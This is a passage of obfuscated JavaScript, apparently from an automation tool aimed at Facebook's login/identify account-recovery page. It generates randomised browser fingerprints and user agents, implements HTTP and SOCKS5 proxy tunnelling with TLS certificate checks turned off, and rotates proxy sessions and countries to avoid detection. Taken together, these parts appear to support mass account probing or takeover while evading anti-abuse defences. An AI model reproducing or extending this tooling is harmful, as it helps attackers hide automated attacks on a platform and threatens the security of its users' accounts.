  const v112 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v113 = Math.floor(Math.random() * (v112.maxPatch - v112.minPatch + 1)) + v112.minPatch,
    v114 = v112.major + ".0." + v112.build + '.' + v113,
    v115 = {};
  return v115.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v114 + " Safari/537.36 Edg/" + v114, v115.browserType = "edge", v115.isMobile = false, v115.clientHints = {}, v115.clientHints["sec-ch-ua"] = "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"" + v112.major + "\", \"Microsoft Edge\";v=\"" + v112.major + '\x22', v115.clientHints["sec-ch-ua-full-version-list"] = "\"Not;A=Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"" + v114 + "\", \"Microsoft Edge\";v=\"" + v114 + '\x22', v115.clientHints["sec-ch-ua-mobile"] = '?0', v115.clientHints["sec-ch-ua-model"] = '\x22\x22', v115.clientHints["sec-ch-ua-platform"] = "\"Windows\"", v115.clientHints["sec-ch-ua-platform-version"] = "\"19.0.0\"", v115.clientHints["sec-ch-prefers-color-scheme"] = "dark", v115;
}
function getDesktopFirefoxUA() {
  const v116 = Math.floor(Math.random() * 20) + 125;
  const v117 = Math.floor(Math.random() * 3),
    v118 = {};
  return v118.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:" + v116 + '.' + v117 + ") Gecko/20100101 Firefox/" + v116 + '.' + v117, v118.browserType = "firefox", v118.isMobile = false, v118.clientHints = {}, v118;
}
function getDuckDuckGoDesktopUA() {
  const v119 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v120 = Math.floor(Math.random() * (v119.maxPatch - v119.minPatch + 1)) + v119.minPatch,
    v121 = v119.major + ".0." + v119.build + '.' + v120,
    v122 = {};
  v122.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v121 + " Safari/537.36 DuckDuckGo/5", v122.browserType = "duckduckgo", v122.isMobile = false, v122.clientHints = {}, v122.clientHints["sec-ch-ua"] = "\"Chromium\";v=\"" + v119.major + "\", \"Not=A?Brand\";v=\"24\", \"DuckDuckGo\";v=\"5\"", v122.clientHints["sec-ch-ua-mobile"] = '?0', v122.clientHints["sec-ch-ua-model"] = '\x22\x22', v122.clientHints["sec-ch-ua-platform"] = "\"Windows\"", v122.clientHints["sec-ch-ua-platform-version"] = "\"19.0.0\"";
  return v122.clientHints["sec-ch-prefers-color-scheme"] = "dark", v122;
}
function getDuckDuckGoMobileUA() {
  const v123 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v124 = Math.floor(Math.random() * (v123.maxPatch - v123.minPatch + 1)) + v123.minPatch,
    v125 = v123.major + ".0." + v123.build + '.' + v124,
    v126 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)],
    v127 = {};
  v127.userAgent = "Mozilla/5.0 (Linux; Android " + v126.os + ';\x20' + v126.model + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v125 + " Mobile Safari/537.36 DuckDuckGo/5", v127.browserType = "duckduckgo", v127.isMobile = true, v127.clientHints = {}, v127.clientHints["sec-ch-ua"] = "\"Chromium\";v=\"" + v123.major + "\", \"Not=A?Brand\";v=\"24\", \"DuckDuckGo\";v=\"5\"", v127.clientHints["sec-ch-ua-mobile"] = '?1', v127.clientHints["sec-ch-ua-model"] = '\x22' + v126.model + '\x22';
  return v127.clientHints["sec-ch-ua-platform"] = "\"Android\"", v127.clientHints["sec-ch-ua-platform-version"] = '\x22' + v126.os + ".0.0\"", v127.clientHints["sec-ch-prefers-color-scheme"] = "dark", v127;
}
function getDesktopOperaUA() {
  const v128 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v129 = Math.floor(Math.random() * (v128.maxPatch - v128.minPatch + 1)) + v128.minPatch,
    v130 = v128.major + ".0." + v128.build + '.' + v129,
    v131 = Math.max(100, v128.major - 10),
    v132 = {};
  v132.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v130 + " Safari/537.36 OPR/" + v131 + ".0.0.0", v132.browserType = "opera", v132.isMobile = false, v132.clientHints = {};
  return v132.clientHints["sec-ch-ua"] = "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"" + v128.major + "\", \"Opera\";v=\"" + v131 + '\x22', v132.clientHints["sec-ch-ua-full-version-list"] = "\"Not;A=Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"" + v130 + "\", \"Opera\";v=\"" + v131 + ".0.0.0\"", v132.clientHints["sec-ch-ua-mobile"] = '?0', v132.clientHints["sec-ch-ua-model"] = '\x22\x22', v132.clientHints["sec-ch-ua-platform"] = "\"Windows\"", v132.clientHints["sec-ch-ua-platform-version"] = "\"19.0.0\"", v132.clientHints["sec-ch-prefers-color-scheme"] = "dark", v132;
}
function getMobileOperaUA() {
  const v133 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v134 = Math.floor(Math.random() * (v133.maxPatch - v133.minPatch + 1)) + v133.minPatch,
    v135 = v133.major + ".0." + v133.build + '.' + v134,
    v136 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)],
    v137 = Math.max(78, v133.major - 62),
    v138 = {};
  return v138.userAgent = "Mozilla/5.0 (Linux; Android " + v136.os + ';\x20' + v136.model + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v135 + " Mobile Safari/537.36 OPR/" + v137 + ".0.0.0", v138.browserType = "opera", v138.isMobile = true, v138.clientHints = {}, v138.clientHints["sec-ch-ua"] = "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"" + v133.major + "\", \"Opera\";v=\"" + v137 + '\x22', v138.clientHints["sec-ch-ua-mobile"] = '?1', v138.clientHints["sec-ch-ua-model"] = '\x22' + v136.model + '\x22', v138.clientHints["sec-ch-ua-platform"] = "\"Android\"", v138.clientHints["sec-ch-ua-platform-version"] = '\x22' + v136.os + ".0.0\"", v138.clientHints["sec-ch-prefers-color-scheme"] = "dark", v138;
}
function getDesktopBraveUA() {
  const v139 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v140 = Math.floor(Math.random() * (v139.maxPatch - v139.minPatch + 1)) + v139.minPatch,
    v141 = v139.major + ".0." + v139.build + '.' + v140,
    v142 = {};
  v142.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v141 + " Safari/537.36", v142.browserType = "brave";
  v142.isMobile = false, v142.clientHints = {};
  return v142.clientHints["sec-ch-ua"] = "\"Brave\";v=\"" + v139.major + "\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"" + v139.major + '\x22', v142.clientHints["sec-ch-ua-full-version-list"] = "\"Brave\";v=\"" + v141 + "\", \"Not;A=Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"" + v141 + '\x22', v142.clientHints["sec-ch-ua-mobile"] = '?0', v142.clientHints["sec-ch-ua-model"] = '\x22\x22', v142.clientHints["sec-ch-ua-platform"] = "\"Windows\"", v142.clientHints["sec-ch-ua-platform-version"] = "\"19.0.0\"", v142.clientHints["sec-ch-prefers-color-scheme"] = "dark", v142;
}
function getMobileBraveUA() {
  const v143 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v144 = Math.floor(Math.random() * (v143.maxPatch - v143.minPatch + 1)) + v143.minPatch;
  const v145 = v143.major + ".0." + v143.build + '.' + v144,
    v146 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)],
    v147 = {};
  return v147.userAgent = "Mozilla/5.0 (Linux; Android " + v146.os + ';\x20' + v146.model + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v145 + " Mobile Safari/537.36", v147.browserType = "brave", v147.isMobile = true, v147.clientHints = {}, v147.clientHints["sec-ch-ua"] = "\"Brave\";v=\"" + v143.major + "\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"" + v143.major + '\x22', v147.clientHints["sec-ch-ua-mobile"] = '?1', v147.clientHints["sec-ch-ua-model"] = '\x22' + v146.model + '\x22', v147.clientHints["sec-ch-ua-platform"] = "\"Android\"", v147.clientHints["sec-ch-ua-platform-version"] = '\x22' + v146.os + ".0.0\"", v147.clientHints["sec-ch-prefers-color-scheme"] = "dark", v147;
}
function getDesktopVivaldiUA() {
  const v148 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v149 = Math.floor(Math.random() * (v148.maxPatch - v148.minPatch + 1)) + v148.minPatch,
    v150 = v148.major + ".0." + v148.build + '.' + v149,
    v151 = Math.max(6, Math.floor((v148.major - 110) / 5) + 5),
    v152 = {};
  return v152.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v150 + " Safari/537.36 Vivaldi/" + v151 + ".0.0.0", v152.browserType = "vivaldi", v152.isMobile = false, v152.clientHints = {}, v152.clientHints["sec-ch-ua"] = "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"" + v148.major + "\", \"Vivaldi\";v=\"" + v151 + '\x22', v152.clientHints["sec-ch-ua-mobile"] = '?0', v152.clientHints["sec-ch-ua-model"] = '\x22\x22', v152.clientHints["sec-ch-ua-platform"] = "\"Windows\"", v152.clientHints["sec-ch-ua-platform-version"] = "\"19.0.0\"", v152.clientHints["sec-ch-prefers-color-scheme"] = "dark", v152;
}
function getMobileFirefoxUA() {
  const v153 = Math.floor(Math.random() * 20) + 125,
    v154 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)],
    v155 = {};
  return v155.userAgent = "Mozilla/5.0 (Android " + v154.os + "; Mobile; rv:" + v153 + ".0) Gecko/" + v153 + ".0 Firefox/" + v153 + '.0', v155.browserType = "firefox", v155.isMobile = true, v155.clientHints = {}, v155;
}
const v30 = {};
v30.fn = getDesktopChromeUA, v30.weight = 0x16, v30.type = "chrome";
const v31 = {};
v31.fn = getMobileUserAgent, v31.weight = 0x12, v31.type = "chrome";
const v32 = {};
v32.fn = getSamsungUserAgent, v32.weight = 0xa, v32.type = "samsung";
const v33 = {};
v33.fn = getDesktopFirefoxUA, v33.weight = 0x8, v33.type = "firefox";
const v34 = {};
v34.fn = getMobileFirefoxUA, v34.weight = 0x5, v34.type = "firefox";
const v35 = {};
v35.fn = getDesktopEdgeUA, v35.weight = 0x8, v35.type = "edge";
const v36 = {};
v36.fn = getDuckDuckGoDesktopUA, v36.weight = 0x6, v36.type = "duckduckgo";
const v37 = {};
v37.fn = getDuckDuckGoMobileUA, v37.weight = 0x6, v37.type = "duckduckgo";
const v38 = {};
v38.fn = getDesktopOperaUA, v38.weight = 0x4, v38.type = "opera";
const v39 = {};
v39.fn = getMobileOperaUA, v39.weight = 0x4, v39.type = "opera";
const v40 = {};
v40.fn = getDesktopBraveUA, v40.weight = 0x4, v40.type = "brave";
const v41 = {};
v41.fn = getMobileBraveUA, v41.weight = 0x3, v41.type = "brave";
const v42 = {};
v42.fn = getDesktopVivaldiUA, v42.weight = 0x2, v42.type = "vivaldi";
const UA_GENERATORS = [v30, v31, v32, v33, v34, v35, v36, v37, v38, v39, v40, v41, v42],
  UA_TOTAL_WEIGHT = UA_GENERATORS.reduce((v156, v157) => v156 + v157.weight, 0);
function getRandomUserAgent() {
  if (SELECTED_BROWSER !== "random") {
    const v159 = UA_GENERATORS.filter(v160 => v160.type === SELECTED_BROWSER);
    if (v159.length > 0) return v159[Math.floor(Math.random() * v159.length)].fn();
  }
  let v158 = Math.random() * UA_TOTAL_WEIGHT;
  for (const v161 of UA_GENERATORS) {
    {
      v158 -= v161.weight;
      if (v158 <= 0) return v161.fn();
    }
  }
  return getDesktopChromeUA();
}
let globalUA = getRandomUserAgent(),
  internalUA = getRandomUserAgent();
function syncUAAndHost() {
  globalUA = getRandomUserAgent();
  internalUA = getRandomUserAgent();
}
function parseProxy(v162) {
  v162 = v162.trim();
  if (!v162) return null;
  try {
    if (v162.startsWith("socks5://") || v162.startsWith("socks4://")) {
      const v164 = new URL(v162);
      return {
        'type': "socks5",
        'host': v164.hostname,
        'port': parseInt(v164.port) || 1080,
        'user': v164.username || null,
        'pass': v164.password || null
      };
    }
    if (v162.startsWith("http://") || v162.startsWith("https://")) {
      {
        const v165 = new URL(v162);
        return {
          'type': "http",
          'host': v165.hostname,
          'port': parseInt(v165.port) || 8080,
          'user': v165.username || null,
          'pass': v165.password || null
        };
      }
    }
  } catch (v166) {}
  if (v162.includes('@')) {
    {
      const v167 = v162.indexOf('@'),
        v168 = v162.slice(0, v167).split(':'),
        v169 = v162.slice(v167 + 1),
        v170 = v169.indexOf(':');
      if (v168.length === 2 && parseInt(v168[1]) > 0) return {
        'type': "http",
        'host': v168[0],
        'port': parseInt(v168[1]),
        'user': v170 > 0 ? v169.slice(0, v170) : v169,
        'pass': v170 > 0 ? v169.slice(v170 + 1) : null
      };
    }
  }
  const v163 = v162.split(':');
  if (v163.length >= 2) return {
    'type': "http",
    'host': v163[0],
    'port': parseInt(v163[1]),
    'user': v163[2] || null,
    'pass': v163[3] || null
  };
  return null;
}
function createHttpProxyAgent(v171) {
  const v172 = v171.user && v171.pass ? "Basic " + Buffer.from(v171.user + ':' + v171.pass).toString("base64") : null,
    v173 = {};
  v173.keepAlive = true;
  const v174 = new https.Agent(v173);
  v174.createConnection = (v175, v176) => {
    const v177 = net.connect(v171.port, v171.host, () => {
      {
        let v179 = "CONNECT " + v175.host + ':' + v175.port + " HTTP/1.1\r\n" + ("Host: " + v175.host + ':' + v175.port + '\x0d\x0a');
        if (v172) v179 += "Proxy-Authorization: " + v172 + '\x0d\x0a';
        v179 += '\x0d\x0a', v177.write(v179);
      }
    });
    let v178 = '';
    const fn2 = v180 => {
        {
          v178 += v180.toString("binary");
          const v181 = v178.indexOf("\r\n\r\n");
          if (v181 !== -1) {
            {
              v177.removeListener("data", fn2), v177.removeListener("error", fn3);
              const v182 = v178.split('\x0d\x0a')[0];
              if (v182.includes(" 200")) {
                {
                  const v183 = Buffer.from(v178.substring(v181 + 4), "binary");
                  if (v183.length > 0) v177.unshift(v183);
                  const v184 = {};
                  v184.socket = v177, v184.servername = v175.host, v184.rejectUnauthorized = false;
                  const v185 = tls.connect(v184);
                  v185.on("error", v186 => {
                    v176(v186);
                  }), v176(null, v185);
                }
              } else v177.destroy(), v176(new Error("Proxy connection failed: " + v182));
            }
          }
        }
      },
      fn3 = v187 => {
        v177.destroy();
        v176(v187);
      };
    v177.on("data", fn2);
    v177.on("error", fn3);
  };
  return v174;
}
function createSocks5ProxyAgent(v188) {
  const v189 = {};
  v189.keepAlive = true;
  const v190 = new https.Agent(v189);
  v190.createConnection = (v191, v192) => {
    const v193 = net.connect(v188.port, v188.host, () => {
      const v196 = v188.user ? [0, 2] : [0];
      const v197 = Buffer.concat([Buffer.from([5, v196.length]), Buffer.from(v196)]);
      v193.write(v197);
    });
    let v194 = "greeting",
      v195 = Buffer.alloc(0);
    const fn4 = v198 => {
        v195 = Buffer.concat([v195, v198]);
        if (v194 === "greeting") {
          {
            if (v195.length < 2) return;
            const v199 = v195[0],
              v200 = v195[1];
            v195 = v195.slice(2);
            if (v199 !== 5) {
              return v193.destroy(), v192(new Error("Invalid SOCKS version: " + v199));
            }
            if (v200 === 2) {
              v194 = "auth";
              const v201 = Buffer.from(v188.user, "utf8"),
                v202 = Buffer.from(v188.pass || '', "utf8"),
                v203 = Buffer.concat([Buffer.from([1, v201.length]), v201, Buffer.from([v202.length]), v202]);
              v193.write(v203);
            } else {
              if (v200 === 0) fn5();else return v193.destroy(), v192(new Error("Unsupported SOCKS auth method: " + v200));
            }
          }
        } else {
          if (v194 === "auth") {
            {
              if (v195.length < 2) return;
              const v204 = v195[1];
              v195 = v195.slice(2);
              if (v204 !== 0) {
                return v193.destroy(), v192(new Error("SOCKS authentication failed"));
              }
              fn5();
            }
          } else {
            if (v194 === "connect") {
              if (v195.length < 4) return;
              const v205 = v195[1],
                v206 = v195[3];
              let v207 = 4;
              if (v206 === 1) v207 += 6;else {
                if (v206 === 3) {
                  {
                    if (v195.length < 5) return;
                    v207 += 1 + v195[4] + 2;
                  }
                } else {
                  if (v206 === 4) v207 += 18;else return v193.destroy(), v192(new Error("Unsupported SOCKS atyp: " + v206));
                }
              }
              if (v195.length < v207) return;
              v195 = v195.slice(v207);
              if (v205 !== 0) return v193.destroy(), v192(new Error("SOCKS connection failed with code: " + v205));
              v193.removeListener("data", fn4), v193.removeListener("error", fn6);
              if (v195.length > 0) v193.unshift(v195);
              const v208 = {};
              v208.socket = v193, v208.servername = v191.host, v208.rejectUnauthorized = false;
              const v209 = tls.connect(v208);
              v209.on("error", v210 => {
                v192(v210);
              }), v192(null, v209);
            }
          }
        }
      },
      fn5 = () => {
        {
          v194 = "connect";
          const v211 = Buffer.from(v191.host, "utf8"),
            v212 = Buffer.alloc(2);
          v212.writeUInt16BE(v191.port, 0);
          const v213 = Buffer.concat([Buffer.from([5, 1, 0, 3, v211.length]), v211, v212]);
          v193.write(v213);
        }
      },
      fn6 = v214 => {
        v193.destroy(), v192(v214);
      };
    v193.on("data", fn4), v193.on("error", fn6);
  };
  return v190;
}
class ProxyManager {
  constructor() {
    this.proxies = [], this.rawLines = [], this.index = 0;
    this.failureCounts = {}, this.deadProxies = new Set();
    this.reviveDeadAt = {}, this.autoCountry = true, this.proxyHits = 0, this.proxyErrors = 0, setInterval(() => {
      const v215 = Date.now();
      for (const [v216, v217] of Object.entries(this.reviveDeadAt)) {
        v215 >= v217 && (this.deadProxies["delete"](Number(v216)), this.failureCounts[v216] = 0, delete this.reviveDeadAt[v216]);
      }
    }, 60000).unref();
  }
  get ["hasProxies"]() {
    return this.proxies.length > 0;
  }
  ["load"](v218) {
    if (!v218) return;
    let v219 = [];
    if (fs.existsSync(v218)) v219 = fs.readFileSync(v218, "utf8").split(/\r?\n/).map(v220 => v220.trim()).filter(v221 => v221 && !v221.startsWith('#'));else {
      if (v218.includes(':')) {
        v219 = [v218];
      }
    }
    this.rawLines = v219;
    this.proxies = [];
    for (const v222 of v219) {
      const v223 = parseProxy(v222);
      if (!v223) {
        {
          console.error(R("\n  ✗ Invalid proxy format detected: \"" + v222 + '\x22'));
          console.error(R("  Please use one of the supported formats:"));
          console.error(R("    - host:port"));
          console.error(R("    - user:pass@host:port"));
          console.error(R("    - host:port:user:pass"));
          console.error(R("    - user:pass:host:port\n"));
          process.exit(1);
        }
      }
      this.proxies.push(v223);
    }
    if (this.proxies.length) console.log(G("  Proxies loaded: " + Y(this.proxies.length)));
  }
  ["getNext"](v224 = null) {
    if (!this.proxies.length) return null;
    const v225 = this.proxies.map((v230, v231) => ({
        'p': v230,
        'i': v231
      })).filter(({
        i: v232
      }) => !this.deadProxies.has(v232)),
      v226 = v225.length ? v225 : this.proxies.map((v233, v234) => ({
        'p': v233,
        'i': v234
      })),
      v227 = v226[this.index % v226.length];
    this.index++;
    const v228 = {
        ...v227.p
      },
      v229 = v228;
    if (v229.user) {
      v229.user = v229.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + randomSessionId()).replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + randomSessionId()).replace(/_sid_[A-Za-z0-9]+/, "_sid_" + randomSessionId()).replace(/_SESSID_[A-Za-z0-9]+/i, "_SESSID_" + randomSessionId());
    }
    if (this.autoCountry && v224 && v229.user) {
      {
        const v235 = detectCountry(v224);
        if (v235) {
          {
            const v236 = v235.toLowerCase();
            if (/-country-[a-z]{2}/i.test(v229.user)) v229.user = v229.user.replace(/(-country-)[a-z]{2}/i, '$1' + v236);else {
              if (/_country_[a-z]{2}/i.test(v229.user)) v229.user = v229.user.replace(/(_country_)[a-z]{2}/i, '$1' + v236);else {
                if (/-cc-[a-z]{2}/i.test(v229.user)) v229.user = v229.user.replace(/(-cc-)[a-z]{2}/i, '$1' + v236);else {
                  if (/_cc_[a-z]{2}/i.test(v229.user)) v229.user = v229.user.replace(/(_cc_)[a-z]{2}/i, '$1' + v236);else {
                    if (/-zone-[a-z]{2}/i.test(v229.user)) {
                      v229.user = v229.user.replace(/(-zone-)[a-z]{2}/i, '$1' + v236);
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    return v229;
  }
  ["recordSuccess"](v237) {
    this.proxyHits++;
  }
  ["recordFailure"](v238) {
    this.proxyErrors++;
    const v239 = v238 % this.proxies.length;
    this.failureCounts[v239] = (this.failureCounts[v239] || 0) + 1;
    if (this.failureCounts[v239] >= 5) {
      this.deadProxies.add(v239), this.reviveDeadAt[v239] = Date.now() + 180000, dbg("[PROXY] Marked proxy #" + v239 + " dead, will revive at " + new Date(this.reviveDeadAt[v239]).toISOString());
    }
  }
  ["getStatus"]() {
    const v240 = this.proxies.length - this.deadProxies.size;
    return v240 + '/' + this.proxies.length + " alive" + (this.autoCountry ? " · Auto-Country" : '');
  }
  ["toUrl"](v241) {
    const v242 = v241.user ? encodeURIComponent(v241.user) + ':' + encodeURIComponent(v241.pass || '') + '@' : '';
    return (v241.type === "socks5" ? "socks5" : "http") + "://" + v242 + v241.host + ':' + v241.port;
  }
  async ["testConnectivity"]() {
    if (!this.hasProxies) return true;
    console.log(C("  ── Proxy Connectivity Test (" + this.proxies.length + " proxies) ──"));
    let v243 = 0,
      v244 = 0;
    const v245 = 12000,
      fn7 = async (v246, v247) => {
        try {
          {
            let v248;
            const v249 = new Promise((v251, v252) => {
                v248 = setTimeout(() => v252(new Error("timeout")), v245);
              }),
              v250 = await Promise.race([httpsGetPage("/login/identify/", '', v245, "www.facebook.com", v246, internalUA), v249]);
            clearTimeout(v248);
            if (v250.status >= 200 && v250.status < 400) {
              {
                v243++;
                return;
              }
            }
            throw new Error("HTTP " + v250.status);
          }
        } catch (v253) {
          this.deadProxies.add(v247), v244++;
        }
      };
    await Promise.all(this.proxies.map((v254, v255) => fn7(v254, v255))), console.log("  ── Result: " + G(v243 + " alive") + " / " + R(v244 + " dead") + " out of " + this.proxies.length + " proxies ──");
    if (v243 === 0) {
      return console.log(R("  All proxies are dead.")), false;
    }
    return console.log(B("  ✓ " + v243 + " proxy/proxies ready. Dead proxies excluded from run.")), true;
  }
}
const proxyManager = new ProxyManager();
function getProxy(v256) {
  return proxyManager.getNext(v256);
}
function randomSessionId() {
  return crypto.randomBytes(6).toString("hex");
}
function getTimezoneOffset(v257) {
  return COUNTRY_TIMEZONE_OFFSETS[v257] !== undefined ? COUNTRY_TIMEZONE_OFFSETS[v257] : 0;
}
function extractProxyCountry(v258) {
  if (!v258 || !v258.user) return null;
  const v259 = v258.user.match(/[-_](?:country|zone|cc)[-_]([A-Za-z]{2})/i);
  return v259 ? v259[1].toUpperCase() : null;
}
function resolveTimezone(v260, v261) {
  const v262 = detectCountry(v261);
  if (v262 && COUNTRY_TIMEZONE_OFFSETS[v262] !== undefined) {
    return COUNTRY_TIMEZONE_OFFSETS[v262];
  }
  const v263 = extractProxyCountry(v260);
  if (v263 && COUNTRY_TIMEZONE_OFFSETS[v263] !== undefined) return COUNTRY_TIMEZONE_OFFSETS[v263];
  return 0;
}
function proxyHttpsRequest(v264, v265, v266, v267 = 15000) {
  return new Promise((v268, v269) => {
    {
      let v270;
      try {
        v264.type === "socks5" ? v270 = createSocks5ProxyAgent(v264) : v270 = createHttpProxyAgent(v264);
      } catch (v274) {
        return v269(new Error("Proxy agent init failed: " + v274.message));
      }
      const v271 = v266 || '',
        v272 = {
          'hostname': v265.hostname,
          'port': 0x1bb,
          'path': v265.path,
          'method': v265.method || "GET",
          'headers': {
            ...v265.headers,
            'Host': v265.hostname
          },
          'agent': v270,
          'timeout': v267,
          'ciphers': "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA",
          'ecdhCurve': "X25519:P-256:P-384",
          'honorCipherOrder': false,
          'secureOptions': require("crypto").constants.SSL_OP_NO_SSLv3 | require("crypto").constants.SSL_OP_NO_TLSv1 | require("crypto").constants.SSL_OP_NO_TLSv1_1
        };
      if (v271) v272.headers["Content-Length"] = Buffer.byteLength(v271);
      dbg("[PROXY REQUEST] → http://" + v264.host + ':' + v264.port + " | " + v265.hostname + v265.path);
      const v273 = https.request(v272, v275 => {
        {
          const v276 = [];
          v275.on("data", v277 => {
            v276.push(v277);
            trackBytes(v277.length);
          }), v275.on("error", v278 => {
            try {
              v269(v278);
            } catch (v279) {}
          }), v275.on("end", () => {
            {
              dbg("[PROXY RESPONSE] HTTP " + v275.statusCode + " from " + v264.host + ':' + v264.port);
              let v280 = Buffer.concat(v276);
              const v281 = v275.headers["content-encoding"];
              if (v281 === "gzip") {
                try {
                  v280 = zlib.gunzipSync(v280);
                } catch (v282) {}
              } else {
                if (v281 === "deflate") try {
                  v280 = zlib.inflateSync(v280);
                } catch (v283) {} else {
                  if (v281 === 'br') {
                    try {
                      v280 = zlib.brotliDecompressSync(v280);
                    } catch (v284) {}
                  }
                }
              }
              v268({
                'status': v275.statusCode,
                'data': v280.toString(),
                'location': v275.headers.location || null,
                'encoding': v281 || null,
                'headers': v275.headers
              });
            }
          });
        }
      });
      v273.on("error", v285 => {
        v269(v285);
      }), v273.on("timeout", () => {
        v273.destroy();
        v269(new Error("timeout"));
      }), v271 && (trackBytes(v271.length), v273.write(v271)), v273.end();
    }
  });
}
function ask(v286) {
  const v287 = {};
  v287.input = process.stdin, v287.output = process.stdout;
  const v288 = readline.createInterface(v287);
  return new Promise(v289 => {
    v288.question(v286, v290 => {
      v288.close(), v289(v290.trim());
    });
  });
}
function httpsGetPage(v291, v292, v293 = 15000, v294 = null, v295 = undefined, v296 = null) {
  const v297 = v294 || FB_HOST,
    v298 = v295 !== null && v295 !== undefined ? v295 : getProxy(),
    v299 = v296 || globalUA;
  if (v298) {
    return proxyHttpsRequest(v298, {
      'hostname': v297,
      'path': v291,
      'method': "GET",
      'headers': {
        'Cookie': v292,
        'User-Agent': v299.userAgent,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        'Accept-Language': "en-US,en;q=0.9",
        'Accept-Encoding': "gzip, deflate, br",
        'Referer': "https://" + v297 + "/login/identify/",
        'Upgrade-Insecure-Requests': '1',
        ...v299.clientHints,
        'sec-fetch-dest': "document",
        'sec-fetch-mode': "navigate",
        'sec-fetch-site': "same-origin",
        'sec-fetch-user': '?1'
      }
    }, null, v293).then(v300 => {
      {
        if (v300.status >= 300 && v300.status < 400 && v300.location) {
          let v302 = v300.location;
          if (v302.startsWith('/')) return httpsGetPage(v302, v292, v293, v297, v298, v299);
          try {
            const v304 = new URL(v302);
            if (v304.hostname.includes("facebook.com")) return httpsGetPage(v304.pathname + v304.search, v292, v293, v304.hostname, v298, v299);
          } catch (v305) {}
          const v303 = {};
          return v303.status = v300.status, v303.redirect = v302, v303.headers = v300.headers || {}, v303;
        }
        const v301 = {};
        return v301.status = v300.status, v301.data = v300.data, v301.headers = v300.headers || {}, v301;
      }
    });
  }
  return new Promise((v306, v307) => {
    {
      const v308 = {};
      v308.hostname = v297, v308.port = 0x1bb, v308.path = v291, v308.method = "GET", v308.timeout = v293, v308.headers = {
        'Cookie': v292,
        'User-Agent': v299.userAgent,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        'Accept-Language': v296 && v296.hostCtx ? v296.hostCtx.lang : "en-US,en;q=0.9",
        'Accept-Encoding': "gzip, deflate, br",
        'Referer': "https://" + v297 + "/login/identify/",
        'Upgrade-Insecure-Requests': '1',
        ...v299.clientHints
      }, v308.headers["sec-fetch-dest"] = "document", v308.headers["sec-fetch-mode"] = "navigate", v308.headers["sec-fetch-site"] = "same-origin", v308.headers["sec-fetch-user"] = '?1';
      const v309 = v308,
        v310 = https.request(v309, v311 => {
          {
            if (v311.statusCode >= 300 && v311.statusCode < 400 && v311.headers.location) {
              let v313 = v311.headers.location;
              v311.resume();
              if (v313.startsWith('/')) return httpsGetPage(v313, v292, v293, v297, v295, v299).then(v306)["catch"](v307);
              try {
                {
                  const v315 = new URL(v313);
                  if (v315.hostname.includes("facebook.com")) {
                    return httpsGetPage(v315.pathname + v315.search, v292, v293, v315.hostname, v295, v299).then(v306)["catch"](v307);
                  }
                }
              } catch (v316) {}
              const v314 = {};
              return v314.status = v311.statusCode, v314.redirect = v313, v306(v314);
            }
            const v312 = [];
            v311.on("data", v317 => v312.push(v317)), v311.on("error", v318 => {
              try {
                v307(v318);
              } catch (v319) {}
            }), v311.on("end", () => {
              let v320 = Buffer.concat(v312);
              if (v311.headers["content-encoding"] === "gzip") {
                try {
                  v320 = zlib.gunzipSync(v320);
                } catch (v321) {}
              } else {
                if (v311.headers["content-encoding"] === "deflate") try {
                  v320 = zlib.inflateSync(v320);
                } catch (v322) {} else {
                  if (v311.headers["content-encoding"] === 'br') {
                    try {
                      v320 = zlib.brotliDecompressSync(v320);
                    } catch (v323) {}
                  }
                }
              }
              v306({
                'status': v311.statusCode,
                'data': v320.toString(),
                'headers': v311.headers
              });
            });
